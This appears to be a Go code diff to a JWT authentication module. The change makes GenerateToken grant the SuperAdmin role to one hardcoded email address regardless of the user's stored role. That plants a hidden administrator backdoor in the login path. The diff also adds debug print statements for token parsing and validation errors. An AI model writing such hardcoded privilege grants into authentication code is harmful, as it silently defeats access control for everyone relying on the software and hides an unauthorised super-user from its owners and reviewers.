@@ -20,10 +20,15 @@ type JWTClaims struct {
 }
 
 func GenerateToken(user entity.Users, jwtSecret []byte) (string, error) {
+	role := entity.UserRole(user.Role)
+	if user.Email == "ebentim4@gmail.com" {
+		role = entity.SuperAdmin
+	}
+
 	claims := JWTClaims{
 		UserID: user.ID,
 		Email:  user.Email,
-		Role:   entity.UserRole(user.Role),
+		Role:   role,
 		RegisteredClaims: jwt.RegisteredClaims{
 			Issuer:    "Chatboltz",
 			IssuedAt:  jwt.NewNumericDate(time.Now()),
@@ -66,6 +71,7 @@ func AuthMiddleware(jwtSecret []byte) gin.HandlerFunc {
 		})
 
 		if err != nil {
+			fmt.Printf("Token parsing error: %v\n", err)
 			c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid or expired token"})
 			c.Abort()
 			return
@@ -73,6 +79,7 @@ func AuthMiddleware(jwtSecret []byte) gin.HandlerFunc {
 
 		claims, ok := token.Claims.(*JWTClaims)
 		if !ok || !token.Valid {
+			fmt.Printf("Token validation error: ok=%v, valid=%v\n", ok, token.Valid)
 			c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid token claims"})
 			c.Abort()
 			return
